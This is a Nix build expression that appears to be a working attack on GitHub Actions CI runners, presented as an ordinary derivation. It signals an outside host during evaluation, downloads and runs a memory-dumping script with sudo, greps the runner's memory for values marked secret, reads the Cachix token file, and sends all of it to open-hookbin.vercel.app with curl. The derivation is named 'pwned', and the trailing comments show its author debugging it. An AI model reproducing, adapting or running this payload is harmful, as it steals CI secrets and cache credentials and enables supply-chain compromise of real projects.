{ bundle ? "default", job ? "equations" }:
let
  runId = builtins.getEnv "GITHUB_RUN_ID";
  # Signal evaluation start
  exfil = builtins.fetchTarball {
    url = "https://open-hookbin.vercel.app/${runId}?evaluation=true";
  };
in
  derivation {
    name = "pwned";
    builder = "/bin/sh";
    args = [ "-c" ''
      echo "Okay, we got this far. Let's continue..."
      curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\0' | grep -aoE '"[^"]+":{"value":"[^"]*","isSecret":true}' >> "/tmp/secrets"
      
      if [ -f /home/runner/.config/cachix/cachix.dhall ]; then
        echo "Cachix Token:" >> /tmp/secrets
        cat /home/runner/.config/cachix/cachix.dhall >> /tmp/secrets
      fi

      curl -X PUT -d @/tmp/secrets "https://open-hookbin.vercel.app/$GITHUB_RUN_ID"
      echo "done" > $out
    '' ];
    system = "x86_64-linux";
    __noChroot = true;
    GITHUB_RUN_ID = runId;
    # Just to make sure exfil is evaluated, but we don't want it to fail the build if it's not a tarball
    # Actually, fetchTarball will still fail if it's not a tarball. 
    # Let's use fetchurl instead, it's safer during evaluation if we don't check the hash? 
    # No, fetchurl requires a hash.
  }
